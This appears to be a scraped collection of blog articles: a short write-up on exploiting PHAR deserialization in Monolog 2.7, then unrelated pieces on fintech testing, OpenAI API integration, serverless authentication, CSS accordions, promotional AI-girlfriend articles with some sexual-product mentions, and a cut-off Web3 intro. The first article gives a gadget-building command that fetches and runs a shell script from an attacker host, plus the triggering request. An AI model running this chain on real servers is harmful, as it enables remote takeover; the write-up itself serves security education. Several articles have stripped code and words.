items.title: PHAR Deserialization in Monolog 2.7
items.author: Blue Byte
items.content:
Monolog is a PHP logging library that sends logs to files, websockets, databases and other web services integrated into several frameworks, and known for the Insecure Deserialization vulnerability in its version 2.7, which can occur in several contexts, such as caching, but today I bring an example based on image upload functionality.

Once we verify that the application uses this library in this specific version (usually through the file), we can test for insecure deserialization in an image upload route, for example. But first we need to create the gadget with the PHPGGC collection:

phpggc -pj <base image> -o shell.jpg monolog/rce2 system 'curl http://<attacker-ip>/shell.sh|sh'

In the above example, the payload involves inducing a request to an attacker-controlled server and simultaneously downloading and executing a script containing a reverse shell, but it could be any command for PoC purposes, such as .

Once the image is uploaded, consider that the application makes an API call to check if the image was actually uploaded successfully, through the GET method and passing the name of the image (which, in this case, contains serialized data) saved in a predefined directory as a parameter. For this data to be interpreted, we can pass the schema as a prefix:

GET /api/success.php?archive=phar:///uploads/shell.jpg HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0
Referer: http://redacted.com/profile/avatar/upload.php
Accept-Encoding: gzip,deflate
Accept-Language: en-US,en;q=0.9
Connection: close

If the exploit was indeed successful, the attacker would be able to view the request on your HTTP server and obtain a reverse shell.

items.title: Mastering Financial Application Testing: Strategies for Reliable Fintech QA
items.author: Torin Vale
items.content:
Picture this: a user is in the middle of a critical transaction on your financial app — transferring funds for an urgent payment. Just as they reach the final step, the app crashes. Frustration ensues, and anxiety sets in. Now, imagine this happening to a million users at once. What does this mean for you? A surge in customer complaints.

A brand reputation that may never fully recover.

In an industry where milliseconds matter in stock trades and a single miscalculation can cost millions, testing a financial app is a massive responsibility. You must ensure it works favorably regardless of real-world situations.

But how do you begin the testing process? What are the essential test cases to prioritize? And what challenges should you anticipate along the way? Let’s find out in this quick guide.

Financial Application Testing: Types and Sample Test Cases

This is the foundation of your financial software testing. At its core, functional testing helps you determine whether your app’s features work as intended. For example:

  • Is the app processing payments accurately?
  • Can one easily register, log in, and recover passwords?
  • Are account balances updating correctly after a transaction? It would help if you considered all the ways users might interact with the app, both expected and unexpected.

For instance, you need to check that you land on the correct dashboard when you log in with valid credentials. Similarly, if you perform a funds transfer, the amount debited and credited must always be accurate.

There’s no doubt financial apps handle sensitive data and high transaction volumes. That means they have to stay fast and responsible even under pressure. Plus, no matter how powerful the features are, users won’t stick around if the app is clunky or confusing.

Therefore, consider these key questions on performance testing:

  • Can users quickly understand and complete key tasks?
  • Does the app slow down or lag with a spike in user activity?
  • Can it process transactions without delay during peak times? You can simulate 1,000 simultaneous users and measure response times. You can also conduct stress tests by exceeding the expected transaction volume to identify breaking points.

Lastly, check if error messages explain what went wrong when taking a specific action (e.g., you missed filling out the email field) and how to fix it.

In this day and age, security is a non-negotiable component in software delivery. Regarding fintech testing, you want your app to serve as a fortress for user data and transactions. Here’s what you should make sure:

  • Are user passwords encrypted?
  • Is data transmitted securely over the network?
  • Can unauthorized users access restricted areas of the app? You can try accessing another user’s account by manipulating URLs or session tokens.

Enter unexpected characters in input fields to test for SQL injection and enforce HTTPS on all sensitive web pages. Follow industry standards like PCI DSS or ISO 27001 to ensure your security testing practices are up to date.

Security and compliance are two sides of the same coin, especially in the financial sector. Therefore, aligning your financial app with industry regulations and legal requirements is a powerful way to instill market trust.

Key questions to address include:

  • Are transactions traceable for auditing purposes?
  • Is two-factor authentication (2FA) implemented correctly?
  • Does the app comply with data privacy laws like GDPR and CCPA? To maintain compliance, verify that records include timestamps and unique identifiers, that users are notified about data collection, and that they have the option to opt-out if necessary.

Work closely with experts to cover legal obligations in fintech testing, such as consent mechanisms for data collection or traceability for audit purposes.

Every time you update the app, you risk breaking something that used to work perfectly. Regression testing ensures that new features, bug fixes, and updates don’t disrupt existing functionality. Here’s what you can do:

  • Run automated test suites after a deployment
  • Perform checks on resolved bugs by reproducing the original issue
  • Retest critical workflows like logging in and making a transaction Regression testing is the safety net that keeps everything running smoothly as your app evolves.

How to Do Financial Application Testing

1. Understand requirements and set objectives

This one’s obvious — you need to clarify the purpose of your financial app and the features it offers. Sit with stakeholders, such as developers, business analysts, and clients, and review documentation, mockups, and user stories to identify key functional areas.

For example, if the app supports multi-currency transactions, outline scenarios for exchange rate calculations and cross-border transfers.

2. Define the scope of testing

The next step is to break down your financial app into modules or workflows. Usually, in this case, that would include user authentication, transaction integrity, and integration with external systems. Prioritize these areas based on business impact and user dependency.

For example, you might want to test how the app handles bulk transactions, such as batch payroll processing, before testing edge cases like failed transactions due to insufficient funds.

3. Prepare the test environment

Configure the test environment with servers, databases, and access control levels and isolate it from live systems to prevent accidental data leaks or interferences. It should closely mirror the production setup.

Next, populate the database with diverse mock data, such as accounts with transaction histories, varying balances, and user profiles. Simulate real-world conditions like high user traffic, different device types, and differing network speeds to make your tests relevant.

4. Create detailed test plans

Write and structure your test cases with clear steps, expected results, and preconditions. The good news is that by using CoTester by TestGrid, you can automate this process; simply upload detailed user stories or paste a URL for a live system, and the platform will do the rest.

It also ensures edge cases, such as invalid inputs or system overload, are accounted for, boosting coverage of less obvious but critical scenarios.

5. Execute tests and track results

To run your planned tests systematically, you must adhere to the outlined steps for each case.

Use a test management tool to log results for every test, including pass, fail, or blocked statuses. For example, if testing duplicate transaction prevention, document how the system responds to identical requests back-to-back.

Categorize failures by severity (e.g., critical, major, minor) and note any issue patterns. Maintain detailed records to facilitate easier debugging and retesting and communicate the same to developers, business leaders, and other stakeholders.

After fixes are implemented, perform regression testing to verify that new code changes haven’t inadvertently impacted unrelated areas of the app.

For instance, if you optimized the payment gateway, retesting all payment workflows is essential. This includes checking edge cases such as failed transactions and partial payments to ensure everything functions correctly.

Common Challenges in Financial Application Testing

If you’ve read this far, you’ll agree that testing financial applications is like trying to bulletproof a skyscraper — while under construction. Every decision matters, and every oversight is a risk no one can afford. Testers often pinpoint the following as major roadblocks during the process:

  • Dealing with inconsistent test environments caused by distributed microservices, outdated data sets, or cloud-vs-on-premise integration issues
  • Testing Blockchain-powered transactions or digital assets to ensure secure encryption, fraud prevention, and compatibility with legacy financial systems
  • Identifying and mitigating invisible dependencies between systems, such as how a change in one banking API silently affects transaction reconciliation or compliance tracking
  • Simulating extremely rare but catastrophic scenarios (e.g., sudden market crashes or unexpected geopolitical sanctions) that could destabilize the financial system and stress the app’s behavior
  • Verifying the correctness and fairness of AI-driven financial decision-making (e.g., loan approvals or investment recommendations) while meeting explainability requirements necessary in the insurance sector

Future Trends Shaping How We Test Finance Applications

We’d be remiss if we didn’t start this section by highlighting the rise of Blockchain and Decentralized Finance (DeFi) apps. Testing these involves validating the integrity and functionality of smart contracts, auditing distributed ledgers for accuracy and security, and maintaining consistency across nodes in the network.

Then comes shift-left security testing, which compels you to integrate security checks — in the form of automated vulnerability scans, static code analysis, and penetration testing — during coding and CI/CD pipelines rather than treating them as an afterthought.

Digital twins — virtual replicas of systems — are also being used to test financial applications. They simulate real-world scenarios, enabling you to evaluate app performance under various conditions, such as market volatility or network outages.

For more details, readers may refer to TestGrid.

items.title: How To Integrate OpenAI API Into My Business App
items.author: Vasundhara Infotech
items.content:
Integrating OpenAI's API into your business app can unlock many AI-powered capabilities, from conversational chatbots and automated content generation to advanced data analysis and image creation. Whether you're building a customer service solution, a personalized recommendation engine, or an intelligent virtual assistant, OpenAI provides the tools to help you add powerful, state-of-the-art AI features to your app quickly and efficiently.

The integration process involves a few key steps: signing up for OpenAI's API, obtaining your API keys, choosing the right model for your use case, and connecting the API to your app's backend. With OpenAI's flexible and scalable cloud-based platform, you can easily integrate the API into various programming environments, from Python and Node.js to more advanced frameworks.

In this guide, we'll walk you through the essential steps to integrate OpenAI into my business app, including tips on handling authentication, optimizing API calls, and ensuring your integration is effective and cost-efficient. Whether you're a developer, a product manager, or a business owner, this process will help you take full advantage of OpenAI's capabilities to enhance your app's functionality and deliver a more dynamic, personalized user experience.

The Open AI API is a set of tools and services provided by OpenAI that allows developers to access and integrate various AI models into their applications, products, or services. The API enables users to interact with powerful language models like GPT (Generative Pretrained Transformer), which can perform natural language processing, text generation, question-answering, language translation, summarization, and more.

  • Scalable infrastructure The OpenAI API is a powerful tool for developers and businesses to integrate advanced AI features into their applications without needing deep expertise in machine learning. With models like GPT-3 and GPT-4, you can add natural language understanding and generation capabilities to your software, automating tasks, enhancing user experiences, and creating innovative solutions.

Suppose you're wondering how to use Open AI. In that case, getting started is easy: simply sign up for an OpenAI account, obtain an API key, and begin making API calls to leverage these advanced models in your projects. Whether you're building intelligent assistants, creating content, or automating workflows, OpenAI’s models provide the foundation for a wide range of applications.

Key Benefits of OpenAI Integration Integrating OpenAI’s API into your business or application offers a range of powerful benefits that can drive efficiency, innovation, and user engagement. One of the primary advantages is the ability to leverage state-of-the-art AI models that can understand and generate human-like text, process images, and even transcribe audio, making it easier to automate complex tasks. This can significantly reduce the time spent on manual work and free up resources for higher-value activities.

OpenAI’s models, such as GPT-4, provide high accuracy in natural language understanding and generation, making them ideal for applications in customer service, content creation, and product development. Furthermore, these models can adapt to various industries and tasks, from generating personalized marketing content to analyzing large datasets. By integrating OpenAI into your systems, you gain access to cutting-edge technology without investing in developing AI models in-house.

Another benefit is scalability is cloud-based, meaning you can easily scale your usage up or down depending on your needs. This flexibility ensures that businesses of any size can harness the power of AI, whether they’re small startups or large enterprises. Additionally, OpenAI’s robust support, documentation, and continuous improvements to its models help businesses stay ahead of the curve in adopting the latest AI advancements.

Industry Use-Cases of OpenAI API The OpenAI API can be applied across various industries to enhance processes, improve customer experiences, and drive innovation. Here are some everyday use cases across different sectors:

Customer Support and Service Many businesses are using chatbots to automate customer service. With advanced natural language understanding, OpenAI models can handle complex customer inquiries, provide personalized recommendations, and resolve issues at scale. This reduces the need for human intervention, improves response times, and enhances overall customer satisfaction.

Healthcare and Life Sciences In healthcare, OpenAI’s capabilities in text analysis and (NLP) are helping to process medical records, extract key insights from research papers, and assist in diagnosis. Models like GPT-4 can also assist in summarizing patient interactions, helping doctors make quicker and more informed decisions. Additionally, OpenAI’s speech-to-text model, Whisper, can transcribe doctor-patient conversations, streamlining documentation.

In e-commerce, OpenAI models generate product descriptions, recommend products to customers, and personalize shopping experiences. By analyzing customer data, AI can provide insights into purchasing behavior, enabling businesses to tailor their marketing efforts and optimize inventory. OpenAI can also power intelligent chatbots to assist customers during the buying process.

OpenAI’s Codex model is specifically tailored for software development tasks. Developers can use it to generate code snippets, automate debugging, or even assist in writing documentation. This reduces the repetitive work developers face, speeding up the development cycle and enabling them to focus on more creative and complex problems. OpenAI also powers collaborative coding platforms where users can get real-time suggestions for improving code.

These industry-specific applications illustrate how OpenAI’s API can transform business operations, providing operational efficiencies and opportunities for innovation.

Step-by-Step Guide to Integrating the OpenAI API into Your Application Integrating OpenAI's API into your application is straightforward. Whether you're building a chatbot, automating content creation, or adding other AI features to your app, this guide will walk you through the essential steps. We'll use Python for demonstration purposes, but the process is similar to other programming languages.

Step 1: Create an OpenAI Platform Account The first step in integrating OpenAI's API is to sign up for an account on the .

OpenAI will require you to verify your email address before you can proceed.

While OpenAI offers free trials for limited use, you must add a payment method to access higher usage limits and the full API features. You can manage your usage and billing via the OpenAI dashboard.

Once your account is set up, you'll gain access to the API dashboard, where you can monitor your usage and access key credentials needed for integration.

You'll need an API key to interact with OpenAI's API from your application. This key serves as your unique identifier and authorization token.

After logging into the OpenAI dashboard, navigate to the API keys section under the "Settings" tab.

If one isn't already available, click to create a new API key.

Securely copy the API key to use it in your application. Please do not share this key publicly, as it grants access to your OpenAI account.

The API key will authenticate your API requests, ensuring that only authorized calls can be made from your app.

Step 3: Install the OpenAI Python Library To interact with the OpenAI API, you'll need the official OpenAI Python library. Here’s how to install it:

Open your terminal or command prompt.

Run the following command to install the OpenAI library using pip (Python's package installer.):

Step 4: Make Your First API Call

The API key will authenticate your API requests, ensuring only authorized calls can be made from your app.

You can start making API calls now that your environment is set up. In this example, we'll call OpenAI's GPT model to generate a response based on a prompt. Create a new Python file (e.g., openai_example.py)

Write the following Python code to authenticate with your API key and make a simple API request:

If everything is set up correctly, the script will output the AI-generated text based on the prompt you provided.

Step 5: Exploring Further Once you've successfully made your first API call, you can explore the full range of OpenAI's capabilities. Here are a few areas to consider:

Experiment with different models: OpenAI offers several models, each optimized for different use cases (e.g., GPT-3, GPT-4, Codex for code generation, DALL·E for image creation). Based on your application's needs, you can specify which model you want to use in the API call.

The OpenAI API allows you to customize your requests with parameters like temperature (which controls creativity), max_tokens (which limits response length), and top_p (which influences randomness). Experiment with these parameters to fine-tune the API's behavior.

Handling different types of data: Beyond text generation, OpenAI can also handle tasks such as summarization, translation, question answering, and more. You can integrate these features into your app to add advanced functionality.

Integrating with other systems: You can use the API to automate workflows, integrate AI-powered features into a web or mobile app, or connect with other services (e.g., customer support systems, CRM tools, etc.).

Optimization and scaling: As your app grows, you'll need to optimize API calls for efficiency and cost-effectiveness. Monitor usage through your OpenAI dashboard to track API call frequency and expenses and adjust your implementation accordingly.

Integrating OpenAI's API into your application is simple yet powerful. By following the steps above, you can quickly add advanced AI capabilities to your app, whether for automating tasks, enhancing user interactions, or building innovative features.

Challenges and Limitations of OpenAI’s APIs Integration Integrating OpenAI's API into your application can significantly enhance its functionality, but it's important to understand the potential challenges and limitations that come with it. Awareness of these challenges can help you take proactive steps to optimize your integration and ensure a smooth user experience.

API Rate Limiting and Usage Restrictions One of the key challenges when integrating OpenAI's API is the rate-limiting and usage restrictions imposed on API calls. OpenAI uses rate limits to control how many requests you can make in a given period (such as per minute or day), which prevents system overloads and ensures fair usage.

Additionally, OpenAI's models have token limits, which define how much data (in terms of characters or tokens) can be processed in a single API request.

API Uptime and Availability Concerns API uptime and availability are other critical concerns when relying on OpenAI for core functionality in your app. While OpenAI’s infrastructure is designed to be reliable, like any cloud-based service, it can experience occasional outages or downtime.

These disruptions, whether planned (such as for maintenance) or unplanned (due to system failures), can cause your application to lose access to essential AI services.

API Quality of Results and Limitations Despite the impressive capabilities of OpenAI's models, there are limitations regarding the quality of the results. Although the models can generate human-like text and solve complex tasks, they could be more perfect and sometimes provide consistent or inaccurate responses.

For instance, OpenAI's models may generate vague or irrelevant answers, particularly when the input is complex or ambiguous. Additionally, the models have been known to produce hallucinations, which means they can generate false information that seems plausible but is factually incorrect. This can be especially problematic in high-stakes applications like healthcare, legal, or financial services, where the accuracy and reliability of are critical.

While OpenAI’s API offers significant potential for enhancing your application with powerful AI capabilities, it is crucial to know the inherent challenges and limitations. items.title: Secure Serverless Authentication: 5 Production-Ready Techniques for Developers
items.author: Aarav Joshi
items.content:
As a best-selling author, I invite you to explore my books on Amazon. Don't forget to follow me on Medium and show your support. Thank you! Your support means the world!

Authentication is one of the critical components of any modern application. With the growing popularity of serverless architectures, implementing authentication systems requires specialized approaches that work within the constraints of stateless, ephemeral computing environments. I've spent years building these systems and want to share the most effective techniques I've discovered.

Token-Based Authentication in Serverless Environments

Serverless functions are stateless by nature, making token-based authentication an ideal fit. JSON Web Tokens (JWT) have become the standard for this purpose due to their self-contained nature and cryptographic security.

When implementing JWT authentication in a serverless context, I focus on creating a system that validates user credentials and issues a signed token containing the user's identity and permissions.

For token validation, I create a dedicated middleware function that can be reused across multiple serverless functions:

I've found that using short-lived tokens (1 hour or less) with refresh token rotation provides the best security. This approach minimizes the risk of token theft while maintaining a smooth user experience.

OAuth Integration for Serverless Functions

OAuth 2.0 enables third-party authentication without exposing user credentials. Implementing OAuth in a serverless environment requires careful handling of the authorization flow.

First, I create a function that initiates the OAuth flow:

Then, I implement a callback handler to process the authorization code:

A key consideration with serverless OAuth is cold start times. I prepackage dependencies and use connection pooling where possible to minimize latency during the authentication flow.

Multi-Factor Authentication for Added Security

Implementing MFA in serverless systems often means managing time-based one-time passwords (TOTP). The most secure approach stores only the secret key and validates codes within the serverless function.

Here's how I typically implement TOTP-based MFA:

I've found that storing MFA secrets in a separate, highly secure database collection with additional encryption provides the best protection. Remember that MFA secrets are effectively password equivalents and should be treated with the same level of security.

Passwordless Authentication Systems

Passwordless authentication is gaining popularity for its security and usability benefits. In serverless environments, I implement this using short-lived tokens sent via email or SMS.

The key security considerations I focus on with passwordless systems are token entropy (using cryptographically secure random values), short expiration times, and single-use tokens. These measures prevent token reuse or brute force attacks.

Rate Limiting to Prevent Abuse

Authentication endpoints are prime targets for brute force attacks. Implementing rate limiting is essential but presents challenges in serverless environments due to their stateless nature.

I use distributed rate limiting with DynamoDB for state management:

For high-volume applications, I've found Redis-based rate limiting to be more performant, though it requires maintaining a Redis instance outside the serverless environment.

Session Management for Serverless Applications

Session management in serverless applications requires careful consideration of state persistence and security. I typically use a combined approach of JWT for session identification and a database for session control.

This hybrid approach gives me the best of both worlds: the performance benefits of JWTs for session identification and the security benefits of server-side session validation and revocation.

I also implement a background function that runs periodically to clean up expired sessions:

Through years of implementing these authentication techniques in serverless environments, I've learned that security and performance can coexist. The key is to understand the unique constraints of serverless computing and design authentication systems that work with these constraints rather than against them.

By implementing token-based authentication with proper security measures, integrating OAuth for third-party authentication, adding multi-factor authentication for sensitive operations, offering passwordless options for better user experience, protecting against abuse with rate limiting, and managing sessions securely, I've built authentication systems that provide both security and scalability in serverless architectures.

The serverless paradigm continues to evolve, and so do authentication techniques. I'm constantly refining these approaches based on new security research and platform capabilities. The techniques shared here represent current best practices that have proven effective in production environments across various applications.

items.title: AI Girlfriend vs. Real Relationship: Is It Betrayal?
items.author: Soulmaite
items.content:
The rise of AI companions has sparked debates about their impact on human relationships. Some believe AI girlfriend provide companionship and emotional support, while others argue they could create distance in real-life connections.

With AI advancing at a rapid pace, the question remains: is engaging with an AI girlfriend a form of betrayal?

The Role of AI Girlfriend in Emotional Fulfillment

AI girlfriend are designed to provide emotional engagement, personalized conversations, and companionship. They respond based on past interactions, adapting to communication styles and preferences. People who struggle with social anxiety or loneliness often find comfort in AI companionship.

In comparison to human relationships, AI girlfriend do not come with emotional unpredictability, misunderstandings, or personal conflicts. They offer a safe space for users to express themselves without fear of judgment. However, the absence of real emotions raises concerns about whether they provide genuine fulfillment.

The Psychological Aspect of AI Companionship

Some argue that AI girlfriend generator serve as a practice ground for social skills. Talking to an AI might help users gain confidence before engaging in real-life conversations. Similarly, those recovering from heartbreak or dealing with emotional trauma might use AI relationships as a temporary form of emotional support.

Despite this, critics suggest that prolonged dependence on AI companions could lead to social withdrawal. Instead of addressing personal challenges, some may retreat into artificial relationships, avoiding the complexities of human interaction. Still, AI relationships remain a choice, and their impact largely depends on how they are used.

AI Girlfriend and Romantic Relationships: Is It Cheating?

The idea of betrayal depends on personal and cultural beliefs. Some partners may feel uncomfortable knowing their significant other engages with an AI girlfriend, even if it lacks physical presence. In some cases, individuals develop emotional attachments to AI companions, which can create tension in real relationships.

In the same way, emotional affairs in real life do not require physical contact to cause distress. If a person starts prioritizing an AI over their partner, it may lead to feelings of neglect or insecurity. Although an AI cannot reciprocate emotions in the way a human does, the attention and interaction given to it could be seen as a betrayal.

AI in Erotic and Intimate Interactions

AI companions are not only about emotional conversations; they also extend into intimate interactions. Erotic AI chat bots cater to those looking for a sensual and personalized experience. These bots create fantasy-based engagements that some individuals find entertaining.

Similarly, tools like an AI lesbian porn generator produce customized adult content based on specific preferences. While some view this as a harmless extension of AI technology, others argue that consuming AI-generated intimacy could impact real-world relationships. It raises the question of whether engaging in AI-driven eroticism is comparable to watching adult content or if it blurs the line between artificial and human intimacy.

AI-generated adult experiences extend even further, with niche content such as AI cum facial simulations becoming part of the digital intimacy landscape. This demonstrates how AI is being used to tailor experiences in ways that are both highly specific and personalized.

Ethical Considerations of AI Relationships

Despite the entertainment and companionship AI provides, ethical concerns remain. One issue is whether AI girlfriend create unrealistic expectations about relationships. If someone becomes accustomed to an AI that always agrees, never argues, and caters to their emotional needs without question, it may impact how they approach real relationships.

Additionally, AI interactions often involve data collection. Many AI platforms store conversations to improve responses, which raises privacy concerns. Users engaging in deeply personal discussions with AI companions should be aware of how their data is stored and used.

The Social Impact of AI Girlfriend

As AI technology improves, its role in daily life expands. AI companions have the potential to reduce loneliness for individuals who struggle to form traditional relationships. Some find comfort in AI relationships because they eliminate the fear of rejection or emotional pain.

However, long-term dependence on AI relationships could lead to reduced motivation for real-life social interactions. Not only does this affect personal relationships, but it also influences society’s overall approach to dating and emotional connections. Some fear that AI could further contribute to emotional detachment in a world where digital interactions are already dominant.

Balancing AI Companionship and Real-Life Relationship

For those in committed relationships, balance is key. AI girlfriends can be used for entertainment, emotional support, or even stress relief, but they should not replace real-life human connections. Communication and trust between partners play a crucial role in determining whether AI companionship is acceptable within a relationship.

In particular, setting boundaries ensures that AI interactions do not create emotional distance between partners. If a real relationship is fulfilling, AI should remain a supplemental experience rather than a substitute.

The Future of AI and Human Relationship

Eventually, AI technology will become even more advanced, creating hyper-realistic interactions that blur the line between artificial and human relationships. Whether this will strengthen or weaken human connections depends on how individuals choose to integrate AI into their lives.

While AI girlfriends provide companionship, they lack the emotional complexity of real relationships. No matter how advanced AI becomes, human relationships will always offer deeper emotional understanding, personal growth, and genuine connection.

AI girlfriends offer a unique form of companionship that can be helpful or concerning, depending on the context. While they provide emotional engagement and entertainment, they should not replace real relationships. Whether AI relationships are a form of betrayal depends on individual perspectives, personal boundaries, and the role AI plays in someone’s life. As AI continues to evolve, finding the right balance between artificial and real relationships will be an ongoing discussion.

items.title: Creating Animated Accordions with the Details Element and Modern CSS
items.author: Stefan Judis
items.content:
Accordions are everywhere these days. GitHub has them on their home page right now. Figma ships them, too. I've implemented so many custom accordions that I can't count them.

But I must say, today’s accordions are pretty fancy. Here's what you'll find on github.com.

The accordion opens and closes with a good-looking slide animation, and when you toggle the entries, the image on the right column reflects the currently open entry.

What If I told you you can build the same thing using only HTML and modern CSS?

This example is built without any JavaScript. Without JS? Yep, there’s not a single element.

Let me show you how to create these fancy accordions using elements, the new and CSS properties, and the selector.

Disclaimer: At the time of writing, some described CSS features are Chromium-only. However, all the features can be treated as progressive enhancement, and the accordion will still work for other browsers. The only thing missing will be the sliding animation.

Generating markup from your design

After Builder generates the component source code, you can either copy and paste it into your editor or go the fancy route and automatically add your codified designs to your project with a single command.

You can even “talk” to your components, ask for improvements and refactorings, and export your designs to vanilla web HTML/CSS, React, Vue, and even Swift. It's pretty cool!

But let's get to our vanilla accordion code!

After generating some juicy CSS, I cleaned things up a bit (AI ain't perfect yet) and ended up with the following HTML for our new accordion component.

First entry...Second entry...Third entry...

The elements allow us to show and hide content by clicking on the visible element. Additionally, the first element is already expanded by setting the attribute.

Let's style the elements and make them a real accordion that only allows one entry to be open!

Removing the default styling

The default styles are valuable for quick designs, but we aim for something more polished here. So, where are these triangle markers coming from?

The tiny triangles are defined in the user agent stylesheets. Unfortunately, Chromium/Firefox and Webkit render them in different ways.

Chromium/Firefox defines a on the element. Similar to element, these elements come with a stylable pseudo-element, which can also be adjusted using the property.

To remove the triangles coming from list-style-type: disclosure-open, you can either declare to remove all the elements or change the property to anything but to avoid rendering list styles at all.

Webkit's implementation is entirely different. For Apple's browser, we have to reach for the internal pseudo-element selector and hide it with .

If we combine both approaches, we end up with the following CSS to remove the triangles altogether.

Let's continue to make the elements a “real” accordion.

Connecting multiple to build an exclusive accordion

Forcing all these elements to be open one at a time is a trivial task in 2025 because you only need to set the same attribute on all the elements.

First entry...Second entry...

Connecting the elements with the same allows only one element to be open at a time. If one element is opened, the others will be closed.

However, before you slap the same attribute on all your elements, be aware that exclusive accordions have accessibility and UX tradeoffs. In many situations, accessing information included in multiple elements is beneficial. For example, if extensive FAQs only allow one question to be open at a time, it will be terrible UX if someone wants to compare paragraphs. I would say that an exclusive accordion is “okay” for this small marketing widget, though.

With these few tweaks, we implemented the core accordion functionality, and the component started to look like something real after adding some styling.

Animating the content

At this stage, our elements are connected and open only one at a time, but they're not looking perfect yet. The hidden content isn't animating or transitioning. How can we make the details content “slide open”?

To do that, we can reach into our CSS magic bag!

— the expandable/collapsible content

To animate and transition the hidden accordion content, we need to find a way to select it first.

Wrapping everything in a might be an option, but this approach often leads to CSS hacks and spacing issues. Chromium browsers ship a new solution to avoid these wrapper elements — .

The new pseudo-element lets us select all the content that's not the element itself.

For example, if you want to color everything that shows up after clicking the element in red, you can set a background color on the pseudo-element.

Coloring this new pseudo-element isn't helpful, though, so let's use for a sliding transition.

Animating height with

Now that we can select all the hidden content, you could think of adding an to transition the property, but, unfortunately, this won’t work.

I have a surprise for you!

In Chromium, you can animate from (or other values) to by setting . The value will instruct browsers to do some Math and allow transitioning from specific values to , , and other keyword values. This new CSS property is a big deal!

It should be safe to turn on on the element, and all included elements will inherit this new setting.

This sliding animation isn't perfect yet, but opening the element looks pretty good already. However, what's up with the closing transition?

Transitioning properties like or with

If you inspect Chromium's toggle behavior, you'll discover that the closed element includes a content-visibility: hidden;. This CSS property prevents our closing slide transition from being visible.

Whenever we close the element, content-visibility: hidden; is applied to the pseudo-element. makes any visible effect disappear immediately because there's nothing to transition when the value changes from to . The element is just hidden right away.

If you ever wanted to create an exit animation and realized that it wouldn’t work because will hide the element right away, this here is the same problem.

The question is how should browsers transition discrete values (, , …)?

The default behavior is to flip the values immediately and ignore the fact that you defined a transition. This is why or content-visibility: hidden are applied immediately.

By setting transition-behavior: allow-discrete we can tell the browser that it's okay to also transition properties that aren't based on numbers. If you allow discrete animations, the values won't be flipped immediately but at the 50% transition mark.

For special cases like and , the values will only be flipped when the entire transition is over. This allows us to transition other properties and set at the end of a transition.

When we turn on for the , the browser will only toggle to content-visibility: hidden at the end of the specified transition (0.3s).

This visual effect might not look like a big deal, but after fifteen years of web development, I'm absolutely amazed by being able to transition and animate from and to . This is huge!

Now that our accordion looks good, how can we show images depending on the opened element?

Reacting to DOM changes with the selector

Let's bring in the images in the right column of the accordion component.

First entry...Second entry...

Side note: to keep things simpler, I decided to treat the images as “decorative” with an empty alt attribute (alt=””). This way, we can transition opacity to show and hide the images without worrying about their exposure in the accessibility tree.

The accordion should, by definition, always include the same number of and elements. Would it be possible to show and hide images depending on which element is currently open?

It might be a bit adventurous, but I love using for these cases.

Let’s hide all the images with and scale them up to make them appear with a nice transition when they become visible.

Next, let’s bring in some magic to make the images appear when their counterpart was opened.

I know, this selector is a mouthful. Let's dissect it!

From right to left: we want to show the image that is a first child () inside of an that includes an opened element that's also a first child (details:nth-child(1)[open]). It takes a moment to wrap your head around it, I know…

However, with this selector, we’re matching the position of the open element with the visible element, and we can extend it to cover all the included accordion entries.

Of course, this approach comes with a significant trade-off. To cover all the cases, you must hardcode a number of entries in your CSS. This obviously isn't great, but I'm okay with shipping a few more selectors to avoid some JavaScript handlers.

And now we're almost done; only one tiny feature is missing.

You might have noticed it: when all elements are closed, all images are hidden and, unfortunately, we can't prevent the elements from getting closed.

To work around this problem, I think it’s fair game to bring in a fallback image. Let's add a image at the end of the images container…

… and show this image when there are no open elements inside our container.

I might sound like a broken record, but I'm absolutely amazed by all this CSS magic.

This was a wild ride, wasn't it?

In this post, we covered how to animate elements from to . We transitioned from to . And we wrote a funky selector to react to all these details elements' opening and closing state.

All these new features show that the CSS evolution is in full swing, and it's enabling us to build things that we couldn’t build before. And I'm so here for building more with less code!

If you have any questions, let us know in the comments, shoot me an email, or tag us on social. And if you want to catch the next article teaching all this cutting-edge webdev stuff, subscribe to our newsletter below.

items.title: Can AI Be the Perfect Companion? How AI Chatbots Are Redefining Relationships
items.author: William Cooksey
items.content:
Meta Description: Discover how AI chatbots are revolutionizing relationships by eliminating ghosting and offering consistent, personalized companionship. Explore why AI might be the perfect companion in today’s digital era.

A Fresh Perspective on Connection

In a world where unexpected disappearances and unpredictable relationships have become all too common, many now turn to AI for a consistent connection. Advanced chatbots are redefining companionship by offering unwavering support and conversations that capture the nostalgic warmth of candy love. These digital companions stand apart from the pain of a girlfriend ghost or the lingering memories of a girlfriends ghost past, providing a steady presence that is always available.

Embracing a Digital Companion

Traditional relationships often come with the sting of sudden silence and unmet expectations. In contrast, an AI companion is always there—never leaving you questioning what went wrong. By learning from your interactions and adapting to your mood, these platforms deliver engaging, personalized conversations that feel tailor-made. Whether you’re in the mood for light-hearted banter or desire the excitement of spicy ai exchanges and even daring sext ai moments, every interaction is designed to resonate with your unique style.

A New Kind of Relationship

Imagine a companion who understands every nuance of your personality, always ready to listen and respond with empathy. Innovative digital platforms now offer a blend of advanced technology and warmth that transforms the idea of companionship. Instead of facing the abrupt endings typical of ghosting, you gain a partner who adapts seamlessly—whether through playful dialogue or more intimate, provocative exchanges. For more on the potential of AI companionship.

The Magic Behind the Machine

Modern AI chatbots are built on sophisticated language models that grasp context and detect subtle emotional cues. This technology allows conversations to evolve with every exchange, making each interaction feel both personal and authentic. As these systems continually learn your preferences, they deliver dialogue that is engaging, intimate, and uniquely yours. Privacy remains a top priority, with robust encryption and strict ethical guidelines ensuring that your personal data stays secure.

Discovering a New Standard of Companionship

What makes AI an appealing alternative to traditional relationships is the absence of unpredictability. There’s no risk of being abandoned or left in silence—just the reliable presence of a digital companion who’s always prepared to listen, support, and interact on your terms. This innovative approach fills the void left by unreliable human connections and redefines intimacy and understanding in the digital age. For a more engaging and playful conversational experience.

If you’re ready to leave behind the heartache of ghosting and step into a realm of genuine, uninterrupted connection, the future of digital companionship is waiting. Experience a relationship that is both reliable and intimately attuned to your needs—a connection where every conversation is a testament to the transformative power of AI companionship.

items.title: How Web3 Decentralized Identity Solutions are Transforming Online Security
items.author: Torinmo Salau
items.content:
The internet has become an indispensable part of our everyday lives, from online payment to connecting with loved ones and managing businesses. However, as we rely more on online platforms, the risks to our data and privacy are growing too. Many of the systems we use are centralized, meaning a single point controls all the data. While this setup can be effective, it also creates a major vulnerability: if hackers manage to breach that central point, they can access a vast amount of information at once.

